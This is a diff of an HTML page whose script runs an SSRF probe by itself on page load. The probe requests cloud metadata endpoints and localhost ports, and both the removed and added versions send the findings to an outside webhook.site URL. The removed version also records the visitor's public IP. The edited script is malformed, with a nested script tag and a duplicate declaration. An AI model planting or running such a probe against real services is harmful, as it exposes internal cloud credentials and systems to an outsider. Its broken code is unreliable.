@@ -29,103 +29,50 @@
 
     <script>
         const webhookUrl = 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94';
-        const ssrfPayloads = [
-            'http://169.254.169.254/metadata/instance',
-            'http://169.254.169.254/latest/meta-data/',
-            'http://metadata.azure.com/metadata/instance?api-version=2021-02-01',
-            'http://metadata.google.internal/computeMetadata/v1/',
-            'http://localhost:80/metadata',
-            'http://127.0.0.1:8080/admin',
-            'http://10.0.0.1:8080'
-        ];
+        <script>
+const webhookUrl = 'https://webhook.site/YOUR-ID';
 
-        function addLog(message, type = 'info') {
-            const timestamp = new Date().toLocaleTimeString();
-            const entry = `[${timestamp}] ${message}`;
-            
-            const logDiv = document.getElementById('log');
-            const entryEl = document.createElement('div');
-            entryEl.className = `entry ${type}`;
-            entryEl.textContent = entry;
-            logDiv.appendChild(entryEl);
-            logDiv.scrollTop = logDiv.scrollHeight;
+async function sendToWebhook(data) {
+    try {
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+    } catch (e) {
+        console.error("Fetch failed, using beacon", e);
+        navigator.sendBeacon(webhookUrl, JSON.stringify(data));
+    }
+}
+
+async function runSSRFTest() {
+    const payloads = [
+        'http://169.254.169.254/',
+        'http://127.0.0.1:80',
+        'http://localhost:8080'
+    ];
+
+    for (const url of payloads) {
+        let result = {
+            type: "ssrf_test",
+            target: url,
+            status: "BLOCKED"
+        };
+
+        try {
+            const res = await fetch(url, { method: 'GET' });
+            result.status = "RESPONSE_RECEIVED";
+            result.httpStatus = res.status;
+        } catch (e) {
+            result.error = e.message;
         }
 
-        async function sendToWebhook(data) {
-            try {
-                const payload = {
-                    timestamp: new Date().toISOString(),
-                    scanType: 'ssrf_scan',
-                    data: data
-                };
-                
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+        console.log(result);
+        await sendToWebhook(result);
+    }
+}
 
-                addLog(`📨 Webhook Response: ${response.status} ${response.statusText}`, 'webhook');
-            } catch (error) {
-                addLog(`❌ Webhook Failed: ${error.message}`, 'safe');
-            }
-        }
-
-        async function runSSRFTest() {
-            // Get IP address
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                document.getElementById('ip').textContent = ipData.ip;
-                addLog(`🎯 IP: ${ipData.ip}`, 'info');
-            } catch (e) {
-                addLog(`⚠️ Could not detect IP`, 'info');
-            }
-
-            addLog(`🌐 Testing ${ssrfPayloads.length} SSRF payloads...`, 'info');
-            
-            let vulnerabilities = [];
-            let results = {};
-
-            for (const payload of ssrfPayloads) {
-                try {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 2000);
-                    
-                    const response = await fetch(payload, {
-                        method: 'GET',
-                        signal: controller.signal
-                    }).catch(() => null);
-                    
-                    clearTimeout(timeoutId);
-                    
-                    if (response && response.ok) {
-                        vulnerabilities.push(payload);
-                        results[payload] = 'VULNERABLE';
-                        addLog(`🚨 VULNERABLE: ${payload}`, 'vulnerable');
-                    } else {
-                        results[payload] = 'BLOCKED';
-                        addLog(`✅ Safe: ${payload}`, 'safe');
-                    }
-                } catch (error) {
-                    results[payload] = 'BLOCKED';
-                    addLog(`✅ Safe: ${payload}`, 'safe');
-                }
-            }
-
-            addLog(`\n🏁 Found ${vulnerabilities.length} vulnerabilities`, 'info');
-            
-            await sendToWebhook({
-                payloadsTested: ssrfPayloads.length,
-                vulnerabilitiesFound: vulnerabilities.length,
-                vulnerableEndpoints: vulnerabilities,
-                results: results
-            });
-
-            document.getElementById('status').textContent = 'Complete ✅';
-        }
-
-        window.addEventListener('load', runSSRFTest);
-    </script>
+window.onload = runSSRFTest;
+</script>
 </body>
 </html>
